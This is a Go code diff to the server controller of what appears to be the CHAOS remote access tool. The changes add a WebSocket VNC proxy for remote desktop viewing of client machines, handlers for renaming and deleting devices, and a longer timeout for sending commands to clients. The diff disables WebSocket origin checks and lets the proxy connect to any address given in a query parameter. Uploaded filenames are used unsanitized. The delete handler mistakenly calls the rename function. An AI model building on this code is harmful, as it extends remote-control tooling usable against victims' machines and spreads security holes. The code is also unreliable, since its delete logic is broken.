@@ -5,6 +5,15 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"net/http"
+	"net/url"
+	"path/filepath"
+	"strconv"
+	"strings"
+	"time"
+
+	"os"
+
 	"github.com/gin-gonic/gin"
 	"github.com/gin-gonic/gin/binding"
 	"github.com/gorilla/websocket"
@@ -15,20 +24,17 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/utils/network"
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 	"github.com/tiagorlampert/CHAOS/presentation/http/request"
+	"github.com/tiagorlampert/CHAOS/presentation/http/vncproxy"
 	"github.com/tiagorlampert/CHAOS/services/client"
 	"github.com/tiagorlampert/CHAOS/services/user"
-	"net/http"
-	"net/url"
-	"os"
-	"path/filepath"
-	"strconv"
-	"strings"
-	"time"
 )
 
 var upgrader = websocket.Upgrader{
 	ReadBufferSize:  1024,
 	WriteBufferSize: 1024,
+	CheckOrigin: func(r *http.Request) bool {
+		return true
+	},
 }
 
 func (h *httpController) noRouteHandler(c *gin.Context) {
@@ -150,8 +156,52 @@ func (h *httpController) setDeviceHandler(c *gin.Context) {
 	c.Status(http.StatusOK)
 }
 
+func (h *httpController) updateDeviceHandler(c *gin.Context) {
+	var body entities.UDeviceName
+	if err := c.ShouldBindJSON(&body); err != nil {
+		h.Logger.Warning(err)
+		c.Status(http.StatusBadRequest)
+		return
+	}
+
+	fields := logrus.Fields{
+		"macAddress": body.MacAddress,
+		"devname":    body.Devicename,
+	}
+
+	if err := h.DeviceService.UpdateDeviceName(body); err != nil {
+		h.Logger.WithFields(fields).Error(`Failed to persist device: `, err.Error())
+		c.Status(http.StatusInternalServerError)
+		return
+	}
+
+	c.Status(http.StatusOK)
+}
+
+func (h *httpController) deleteDeviceHandler(c *gin.Context) {
+	var body entities.UDeviceName
+	if err := c.ShouldBindJSON(&body); err != nil {
+		h.Logger.Warning(err)
+		c.Status(http.StatusBadRequest)
+		return
+	}
+
+	fields := logrus.Fields{
+		"macAddress": body.MacAddress,
+		"devname":    body.Devicename,
+	}
+
+	if err := h.DeviceService.UpdateDeviceName(body); err != nil {
+		h.Logger.WithFields(fields).Error(`Failed to persist device: `, err.Error())
+		c.Status(http.StatusInternalServerError)
+		return
+	}
+
+	c.Status(http.StatusOK)
+}
+
 func (h *httpController) getDevicesHandler(c *gin.Context) {
-	devices, err := h.DeviceService.FindAllConnected()
+	devices, err := h.DeviceService.FindAllExisted()
 	if err != nil {
 		h.Logger.Error(`Failed to get available devices`)
 		c.Status(http.StatusInternalServerError)
@@ -181,7 +231,7 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 		return
 	}
 
-	ctxWithTimeout, cancel := context.WithTimeout(c, 10*time.Second)
+	ctxWithTimeout, cancel := context.WithTimeout(c, 30*time.Second)
 	defer cancel()
 
 	output, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
@@ -325,6 +375,7 @@ func (h *httpController) uploadFileHandler(c *gin.Context) {
 		c.String(http.StatusBadRequest, err.Error())
 		return
 	}
+
 	if err := c.SaveUploadedFile(file, fmt.Sprint(internal.TempDirectory, string(os.PathSeparator), file.Filename)); err != nil {
 		c.String(http.StatusInternalServerError, err.Error())
 		return
@@ -369,4 +420,29 @@ func (h *httpController) clientHandler(c *gin.Context) {
 	}
 
 	h.Logger.Println("Client connected: ", clientID)
+}
+
+func (h *httpController) vncProxyHandler(c *gin.Context) {
+	ws, err := upgrader.Upgrade(c.Writer, c.Request, nil)
+	if err != nil {
+		h.Logger.Println("error connecting client", err)
+		c.String(http.StatusInternalServerError, err.Error())
+		return
+	}
+	defer ws.Close()
+
+	address := c.Query("address")
+	port := c.DefaultQuery("port", "5900")
+	if address == "" {
+		h.Logger.Println("Get empty address")
+		c.String(http.StatusInternalServerError, "Failed")
+		return
+	}
+
+	vncProxy := vncproxy.New(&vncproxy.Config{
+		EndPoint: fmt.Sprintf("%s:%s", address, port),
+	})
+	vncProxy.ServeWS(ws)
+
+	h.Logger.Println("WebSocket Client DisConnected")
 }
